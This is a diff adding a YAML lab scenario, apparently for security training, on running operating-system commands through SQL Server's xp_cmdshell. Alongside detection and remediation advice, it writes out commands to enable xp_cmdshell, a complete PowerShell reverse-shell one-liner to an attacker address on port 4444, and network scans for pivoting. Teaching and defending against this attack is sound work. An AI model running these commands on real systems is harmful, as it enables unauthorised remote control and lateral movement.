@@ -1,0 +1,107 @@
+# Category: Database Security
+name: "SQL Server xp_cmdshell – Command Execution via Database"
+id: "database-sqlserver-xp-001"
+category: "database_security"
+subcategory: "mssql"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit SQL Server's extended stored procedure `xp_cmdshell` to execute
+  operating system commands as the SQL Server service account. This requires
+  the attacker to have `sysadmin` role or other high privileges. Often used
+  in conjunction with SQL injection or misconfigured database accounts.
+
+learning_objectives:
+  - Understand extended stored procedures in SQL Server
+  - Enable `xp_cmdshell` if disabled
+  - Execute commands to gain a reverse shell
+  - Pivot to other database servers
+
+tools:
+  - SQL Server Management Studio (or `sqlcmd`)
+  - Python (pyodbc)
+  - netcat
+  - Metasploit (mssql_payload)
+
+prerequisites:
+  - Valid SQL Server credentials with `sysadmin` role
+  - Port 1433 accessible
+  - SQL Server service account with sufficient permissions
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Connect to SQL Server and check permissions"
+    commands:
+      - "# Using sqlcmd"
+      - "sqlcmd -S <SERVER> -U sa -P password"
+      - "# Check if xp_cmdshell is enabled"
+      - "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
+      - "EXEC sp_configure 'xp_cmdshell';"
+    expected_output: "Configuration status; if 0, it's disabled"
+    detection: "SQL Server logs show connection from unusual IP"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Enable xp_cmdshell and execute commands"
+    commands:
+      - "# Enable xp_cmdshell"
+      - "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+      - "# Execute a simple command"
+      - "EXEC xp_cmdshell 'whoami';"
+      - "# To get reverse shell:"
+      - "EXEC xp_cmdshell 'powershell -c \"$client = New-Object System.Net.Sockets.TCPClient(<ATTACKER_IP>,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"'"
+    expected_output: "Reverse shell as SYSTEM/NETWORK SERVICE"
+    detection: "Windows Event Logs (4688) for process creation (powershell.exe, cmd.exe)"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Pivot to other systems"
+    commands:
+      - "# Use xp_cmdshell to run port scans or use SQL queries to link servers"
+      - "EXEC xp_cmdshell 'nmap -sn 192.168.1.0/24'"
+      - "# Or use linked servers"
+    expected_output: "Map internal network"
+    detection: "Large number of SQL connections; network scans"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1505.003"
+    description: "Server Software Component: SQL Stored Procedures"
+  - standard: "NIST SP 800-53"
+    control: "SC-18"
+    description: "Mobile Code"
+
+detection:
+  network_indicators:
+    - "Traffic from SQL Server to external IP (reverse shell)"
+  log_indicators:
+    - "SQL Server error log showing xp_cmdshell usage"
+    - "Windows security log with process creation from sqlservr.exe"
+  endpoint_indicators:
+    - "cmd.exe or powershell.exe spawned by sqlservr.exe"
+
+remediation:
+  immediate:
+    - "Disable xp_cmdshell unless absolutely necessary"
+    - "Run SQL Server service with minimal privileges (not LOCAL SYSTEM)"
+  long_term:
+    - "Use Windows Authentication with limited permissions"
+    - "Monitor for anomalous SQL queries"
+
+variables:
+  server: "10.0.0.10"
+  attacker_ip: "10.0.0.5"
+  port: "4444"
+
+assessment_questions:
+  - "What privilege is required to execute xp_cmdshell?"
+  - "How can you detect xp_cmdshell execution in SQL logs?"
+  - "What is an alternative way to achieve RCE without xp_cmdshell?"
+
+references:
+  - url: "https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"
+    title: "Microsoft xp_cmdshell documentation"
+  - url: "https://www.sqlshack.com/how-to-enable-and-use-xp_cmdshell-in-sql-server/"
+    title: "SQL Shack - xp_cmdshell"
